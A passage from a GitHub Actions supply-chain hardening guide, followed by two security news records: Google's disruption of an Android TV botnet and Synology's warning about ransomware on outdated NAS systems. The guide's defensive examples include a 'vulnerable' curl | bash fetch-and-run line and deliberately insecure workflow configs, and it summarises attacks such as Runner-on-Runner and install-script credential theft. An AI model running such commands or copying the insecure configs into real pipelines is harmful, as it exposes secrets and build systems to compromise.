Ultralytics and TanStack Router both ran this way: a fork pull request wrote a poisoned entry into the shared cache, and the release pipeline restored it and built from what it found. In both the reviewed source was clean at every point — the cache, not the diff, carried the payload across the trust boundary. Chapter 3 has the full chains.

What to do

Caches are isolated by scope, not by key. A cache written by a plain pull_request run belongs to the merge ref, refs/pull/…/merge, which the base branch cannot restore from. pull_request_target is different: it runs in the base branch's context, so what it writes lands in the default branch's scope, where the release build will find it. That is how both incidents above worked, and it makes the cache problem largely the pull_request_target problem from chapter 3.

The platform now does most of this for you. An event that resolves to the default branch but can be influenced from outside — pull_request_target, issue_comment, workflow_run — gets read-only access to that scope, so the poisoned write above fails today. And cache-mode, generally available since September 2026, lets a workflow or job declare the access it should have: read, write, write-only or none, enforced by the cache service through scoped tokens rather than by the action's good behaviour. GitHub's dependency caching reference has the exact trigger list and the per-trigger defaults.

Set it deliberately. cache-mode: none on release jobs: a release build should be clean and reproducible, and this makes that a property the service enforces rather than a convention the next contributor undoes by adding a setup-* action. cache-mode: read on untrusted jobs. The trap is the override — declaring write or write-only on a low-trust trigger opts that workflow back out of the read-only default and reintroduces exactly the risk this chapter describes. Treat it as a review finding.

Configuration

# Vulnerable, as the 2024-2026 incidents ran: a fork run writes the # shared store that release later reads. on: pull_request_target jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@<sha> with: ref: ${{ github.event.pull_request.head.sha }} - uses: actions/setup-node@<sha> with: cache: pnpm # Today the save fails with a warning, because pull_request_target has # read-only access to the default branch's cache scope, and current # actions/checkout refuses a fork PR head ref unless the workflow sets # allow-unsafe-pr-checkout: true. The write comes back only by opting # out on purpose: # cache-mode: write # reintroduces exactly this vulnerability

# Hardened: a workflow-level default. A job can override it in either # direction, so set the sensitive jobs explicitly rather than relying # on this line. cache-mode: read jobs: # untrusted: restore only, stated in the YAML as well as the token test: runs-on: ubuntu-latest cache-mode: read steps: - uses: actions/cache/restore@<sha> with: path: ~/.pnpm-store key: ${{ runner.os }}-pnpm-${{ hashFiles('pnpm-lock.yaml') }}

# Hardened, release job: no cache access at all, enforced by the service jobs: release: runs-on: ubuntu-latest cache-mode: none steps: - run: pnpm install --frozen-lockfile --ignore-scripts - run: pnpm run build # Never on a low-trust trigger - it opts out of the read-only default # and brings the poisoning risk back: # cache-mode: write

Chapter 6: Isolate or Eliminate Self-Hosted Runners #

The mistake

Attaching a non-ephemeral self-hosted runner to a public repository.

GitHub-hosted runners are destroyed after each job. A self-hosted runner is a persistent machine, so anything an attacker writes to disk, installs as a service or leaves in the work directory survives into the next job, including jobs from other workflows.

The second form of the mistake is treating "require approval for first-time contributors" as the security boundary. It gates the first run, not subsequent ones.

Observed in the wild

PyTorch, 2023. Adnan Khan and John Stawinski landed a trivial markdown typo fix to clear the previous-contributor gate, then submitted a pull request that ran on PyTorch's self-hosted runners and gave them root.

They then developed the Runner on Runner technique: install a second GitHub runner on the compromised host, attached to the attacker's own organization, so the backdoor resembles ordinary runner traffic. From there they could commit to the main branch, upload releases and backdoor related projects. The same researchers later demonstrated the technique at scale against many organizations at DEF CON 32.

What to do

First, try to remove the need. Prefer GitHub-hosted runners. GitHub's own position is that self-hosted runners should almost never be used for public repositories, because anyone who can open a pull request can reach the machine. Treat that as a rule, and spend the effort eliminating the requirement before spending it on hardening.

Where self-hosted runners are unavoidable, use single-job ephemeral runners, provisioned either with --ephemeral at registration or through the just-in-time runner API. A teardown script on a persistent runner is not a substitute: it relies on cleanup completing before the runner can accept another job. Automatic deregistration, however, does not clean the underlying machine. Provision a fresh, isolated environment for each runner and destroy it after the job; Actions Runner Controller on Kubernetes builds on the same idea.

Then bound the blast radius. Use runner groups to decide which organizations, repositories and workflows may schedule onto a runner at all, and keep public repositories off any group that private ones share. Register runners at the level that matches who administers them. Keep sensitive material off the machine and deny it access to cloud metadata and production networks. Require approval for all outside collaborators, not just first-time ones. Avoid passing secrets as command-line arguments, which can be visible to other jobs on the same host.

Runner configuration has more depth than one chapter can carry. GitHub's hardening guidance for self-hosted runners is the reference to work through before standing one up.

Configuration

# Just-in-time runner: generate the config server-side, then start the # runner with it. gh api -X POST /orgs/acme/actions/runners/generate-jitconfig \ -f name="gpu-$(uuidgen)" \ -F runner_group_id=3 \ -f 'labels[]=gpu' \ --jq .encoded_jit_config > jit.cfg ./run.sh --jitconfig "$(cat jit.cfg)" # Deregistration after the job is not cleaning: wipe or discard the host.

# Refuse fork-originated runs on self-hosted labels jobs: gpu-test: if: github.event.pull_request.head.repo.full_name == github.repository runs-on: [self-hosted, linux, gpu]

Chapter 7: Control Dependency Intake #

The mistake

Running a plain npm install in CI: resolving fresh versions, executing every postinstall in the tree, with publish tokens and cloud credentials in the environment.

Teams frequently add dependency scanning and leave the install itself unconstrained. Scanning tells you what is in the tree. The install is where code executes, and most CI compromises in 2025 and 2026 arrived through npm install rather than through a workflow bug.

Observed in the wild

Shai-Hulud and Nx s1ngularity both delivered their payload through an install lifecycle script that harvested credentials and exfiltrated them. nx sent data to attacker-created public GitHub repositories named s1ngularity-repository; Shai-Hulud used attacker-created public repositories as well, which is also how it propagated. The chain was consistent: the install script runs, credentials are harvested, and the victim's own packages are republished infected.

Axios, March 2026 shows why the window matters. Malicious versions 1.14.1 and 0.30.4 were live for approximately three hours, and the payload was hidden in an inserted dependency, plain-crypto-js, rather than in Axios itself. Three hours is long enough to affect any pipeline that resolves dependencies in real time, and short enough that no human review process would have caught it.

What to do

Four controls, all cheap.

Deterministic installs. Use npm ci or pnpm install --frozen-lockfile. Never resolve fresh versions in CI.

No lifecycle scripts by default. Use --ignore-scripts, with an explicit allowlist for the handful of packages that genuinely need a build step. npm 12 adds an allowScripts allowlist for this.

A release-age cooldown, applied where the lockfile is written. min-release-age, added in npm 11.10.0 in February 2026, excludes versions published less than N days ago during resolution. Most malicious versions are removed within hours, so even a one-day cooldown blocks the bulk of them. pnpm, yarn and bun have equivalents. Enforce the npm floor, because older clients ignore the setting silently.

Install-time source controls. The May 2026 npm release added --allow-file, --allow-remote and --allow-directory alongside the existing --allow-git, so you can refuse non-registry install sources outright.

npm ci installs the lockfile without resolving, so min-release-age does not apply there. The cooldown governs what enters the lockfile, which is the moment a freshly published malicious version would be adopted — and that means configuring it in two places, not one. .npmrc covers installs on a developer's machine. The update bot needs its own setting rather than being assumed to honour yours: cooldown for Dependabot, minimumReleaseAge for Renovate, as in chapter 1.

The cooldown is the control that would have prevented the Axios ingestion outright, and it requires no judgment from whoever reviews the bump.

Configuration

# Vulnerable: fresh resolution, every postinstall, secrets in scope - run: npm install env: AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}

# .npmrc, committed to the repository. This governs RESOLUTION: local # installs, and the lockfile changes a bump bot proposes. It does not # gate npm ci, which installs the lockfile without resolving. min-release-age=3 ignore-scripts=true

# Hardened: deterministic, no lifecycle scripts, no secrets in this job, # build steps named explicitly rather than inherited - run: npm ci # ignore-scripts applies here; the cooldown does not # rebuild inherits ignore-scripts from .npmrc too, and reports success # while running nothing - re-enable scripts for the reviewed exceptions - run: npm rebuild --ignore-scripts=false better-sqlite3 esbuild

Chapter 8: Verify Third-Party Scripts and Uploaders #

The mistake

Piping an installer or uploader straight from a vendor URL into a shell: coverage uploaders, CLI installers, release tooling.

A curl | bash in CI is an unpinned code fetch, executed with full job privileges and without independent verification of what arrived. HTTPS authenticates the server, not the payload. The remote file can change at any time, and nothing in your pipeline would notice. The vendor's supply chain becomes yours without a pin, a checksum or a review.

Observed in the wild

Codecov, 2021. An attacker extracted a Google Cloud Storage HMAC key from a layer of Codecov's public Docker image and used it to modify the Bash Uploader served to users. The modified script shipped every environment variable — API keys, tokens, credentials — to an attacker-controlled host.

It ran undetected from 31 January to 1 April 2021 across more than 29,000 customers. It was found only because one customer compared the downloaded file's SHA-256 against the published value.

Two details are worth keeping. Verification was the only control that detected it, and it was the customer's verification rather than the vendor's.

What to do

Replace ad-hoc downloads with a SHA-pinned action wherever one exists.

Where you must fetch a file, pin the exact version, verify a checksum or signature you control, and fail the build on mismatch. Never run verification and execution in the same pipe: download, verify, then execute as separate steps, so a failed check stops the job rather than being swallowed.

Configuration

# Vulnerable: fetch and execute in one unverifiable step curl -s <https://vendor.example/uploader.sh> | bash

# Hardened: pinned version, verified digest, separate steps set -euo pipefail curl -fsSL -o uploader.sh <https://vendor.example/v4.2.1/uploader.sh> echo "9f2b...c71e uploader.sh" | sha256sum -c - bash ./uploader.sh

# Better, where a maintained action exists - but pin both halves - uses: codecov/codecov-action@<sha> # v5.x: pins the wrapper only with: version: v11.2.3 # the CLI it downloads. The default is 'latest', # so the action's SHA does not pin what executes. # Leave the 'binary' input unset: supplying your own CLI bypasses the # action's GPG-signed SHA256SUM check on what it downloads.

Chapter 9: Restrict What the Runner Can Talk To #

The mistake

Unrestricted outbound network access from runners, with no record of what a build contacted.

A compromised step can reach any host on the internet, and nothing in the run log distinguishes that from a normal dependency fetch. Egress control is the last line that still works when an earlier control has already failed, which is exactly when you need one.

Observed in the wild

Every attack in this post ends the same way: data leaving the runner.

Ultralytics ended in a crypto miner calling out from build machines and from every user who installed the poisoned wheel. tj-actions wrote harvested secrets straight into public build logs. nx and Shai-Hulud exfiltrated to attacker-created public GitHub repositories.

That last case is a structural limit, not a gap in somebody's list: an allowlist works on hosts, not on repositories or accounts, so permitting github.com permits pushing to an attacker's repository on it — as it does for any multi-tenant service you allow, from object storage to a paste site. Volume alerting does not close that, because a token is a few hundred bytes leaving in one ordinary-looking request. And tj-actions exfiltrated without any connection to an attacker-controlled endpoint: it wrote the secrets into the public build log, a channel the egress policy never sees. Its payload did arrive over the network, from gist.githubusercontent.com, so egress control had a chance on the way in — just not on the way out. Narrow the list to the services a build needs and scope by path or account where your agent supports it, but treat egress control as narrowing what an attacker can do once an earlier control has failed, not as the layer that tells you it happened.

What to do

Today this means a runner-level egress agent. Several exist as marketplace actions and as self-hosted options, and the choice matters less than the rollout.

Run it in audit mode first, so the allowlist is built from traffic you actually observed rather than traffic you assumed. Review what it reports, then switch to deny-by-default. Expect the audit run to surprise you: most builds reach more hosts than their owners expect, and an allowlist written from memory breaks the build on day one.

Whatever you pick, insist on four properties: an audit mode, deny-by-default once enforced, an alert on blocked destinations rather than a silent drop, and a policy the job itself cannot relax. On that last point, prefer per-job declarations inside centrally enforced limits where the tooling supports it — a job should be able to narrow its own egress and never to widen it. A policy that lives only in the workflow file is a policy a pull request can edit, and a blocked connection nobody sees is a missed incident.

GitHub has announced a native Layer 7 egress firewall for hosted runners that runs outside the runner VM, so it holds even against root inside the job, which an in-VM agent fundamentally cannot. At the time of writing it is on the 2026 roadmap and not generally available.

Configuration

# Phase 1 - learn the real destination set. Run for a week, then read it. jobs: build: runs-on: ubuntu-latest steps: - uses: <your-egress-agent>@<sha> with: policy: audit

# Phase 2 - enforce, with the allowlist derived from phase 1 jobs: build: runs-on: ubuntu-latest steps: - uses: <your-egress-agent>@<sha> with: policy: block allowed: github.com:443 registry.npmjs.org:443 objects.githubusercontent.com:443 # Required properties, whichever agent you choose: # audit mode -> allowlist from observed traffic, not from memory # deny by default once enforced # per-job declarations INSIDE central limits - a job may narrow its # own egress, never widen it # blocked destinations raise an alert, never a silent drop

Where These Controls Stop #

Every control in this post assumes the attacker is outside your organization and has to get in through something you accept from strangers. Within that boundary they hold well, because the enforcement is mechanical rather than a judgment call. Once the attacker holds a valid maintainer credential that assumption breaks: they need no pwn request, no injection and no retagged action, as GhostAction and the LiteLLM compromise of October 2026 showed. They authenticate, and the pipeline does what they ask. That is part two, and it is a different discipline — identity, separation of duty and detection rather than input validation.

Sources

tj-actions/changed-files supply chain attack (CVE-2025-30066) — Wiz

s1ngularity postmortem — Nx

Shai-Hulud npm worm — Unit 42, and the CISA alert

Ultralytics pwn request supply chain attack — Snyk

TanStack npm supply-chain compromise postmortem — TanStack

Self-hosted runner attacks against PyTorch — Legit Security

Codecov Bash Uploader post-mortem — Codecov

Workflow lockfiles in public preview — GitHub

Secure use reference — GitHub Docs

articles.title: Google dismantles botnet secretly running on 1.3 million Android TV boxes
articles.context: Google says it has taken legal action to shut down the domains and servers Videostrong used to operate and install its malware
articles.full_text:
Smashing the botnet

Google worked with several other organizations to disrupt the x.cpe network, including Japan’s National Police Agency, Synthient, and Trend Micro. Google says it has taken legal action to shut down the domains and servers Videostrong used to operate and install its malware. It also went after command-and-control servers operated by Videostrong that were connected to other malware campaigns. Google estimates Videostrong has been cut off from about 10 million compromised devices.

This action should make the affected devices safe to use, but probably not as safe as they should be. Play Protect is still disabled, and the inert malware modules are still installed. Since they are loaded as system apps, users cannot easily remove them.

Synthient has published a list of 182 device model names known to be included in the botnet. Anyone who has purchased a MECOOL or white label Android TV box of unknown origin should check it. Trend Micro counted a total of 1,472,554 infected devices, somewhat higher than Google’s estimate. The overwhelming majority were in Brazil, Malaysia, Iraq, Mexico, and Taiwan, but tens of thousands were also online in the US, Germany, the UK, Australia, and Canada.

Google determined the operation was not the work of a rogue actor, so it has ended its relationship with Videostrong. The company, as well as any subsidiaries, will not be permitted to use Google’s Android apps and services.

Google also notes that it is updating its certification process to close the loophole that allowed Videostrong to operate its botnet on certified devices. Android is open source, though, and there are countless uncertified Android-based TV boxes out there. Videostrong could continue to sell malicious hardware under other brands without Google apps. But it would still have to rebuild its malware operation from scratch.

articles.title: Synology Warns of Ransomware Attacks Targeting NAS Devices Running Outdated DSM Versions
articles.context: Its investigation found that threat actors are taking advantage of a vulnerability that the vendor had already addressed in December 2024
articles.full_text:
Synology warns of ransomware attacks exploiting a 2024 flaw in outdated NAS devices, urging users to update DSM immediately.

A security fix released in 2024 is now at the centre of ransomware attacks against Synology NAS devices. The company has found attackers targeting systems that still run outdated versions of DiskStation Manager (DSM), putting files stored on these network storage devices at risk of encryption and extortion.

Synology disclosed the attacks on October 29, 2026. Its investigation found that threat actors are taking advantage of a vulnerability that the vendor had already addressed in December 2024. “These attacks aim to encrypt data and extort ransom.” The warning highlights how devices left without security updates can remain exposed long after vendors have released a fix.

The company hasn’t identified the exact vulnerability used in the attacks. Instead, it refers customers to Synology-SA-24:20, a security advisory published on November 5, 2024, which documents three flaws affecting DSM. The advisory was updated as fixes became available across different software branches, with the DSM 6.2 update released on December 5.

The three vulnerabilities have different security implications. CVE-2024-10441 is the most severe, with a CVSS score of 9.8. It affects the system plugin daemon and could allow an unauthenticated remote attacker to execute arbitrary code on a vulnerable device.

CVE-2024-50629 has a CVSS score of 5.3 and affects the DSM webapi component. It could allow remote attackers to read limited files. The third issue, CVE-2024-10445, is rated 4.3 and concerns improper certificate validation in the update functionality. It could allow an attacker in an adjacent network position to write limited files.

Synology hasn’t confirmed which of these vulnerabilities attackers are exploiting. The three flaws should therefore be considered part of the security advisory, not three confirmed entry points in the current ransomware campaign.

The vendor has released corrected builds for all the affected DSM branches. Users should check the full version number installed on their NAS and compare it with the minimum fixed releases listed in the advisory:

DSM 7.2.2: 7.2.2-72806-1 or later.

DSM 7.2.1: 7.2.1-69057-6 or later.

DSM 7.2: 7.2-64570-4 or later.

DSM 7.1: 7.1.1-42962-7 or later.

DSM 6.2: 6.2.4-25556-8 or later.

The impact of a ransomware infection on a NAS can extend well beyond the storage device itself. Businesses often use these systems to keep shared documents, operational files and backup copies in one place. If attackers encrypt that data, employees may lose access to essential information, while recovery can become much harder if the NAS also holds the backups needed to restore other systems.

Updating DSM is therefore an immediate priority for administrators and home users alike. Synology is also advising customers to enable automatic updates so that future security fixes don’t depend entirely on someone checking for them manually.

“Synology also recommends enabling automatic updates to keep DSM up to date at all times.” concludes the advisory.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, NAS)
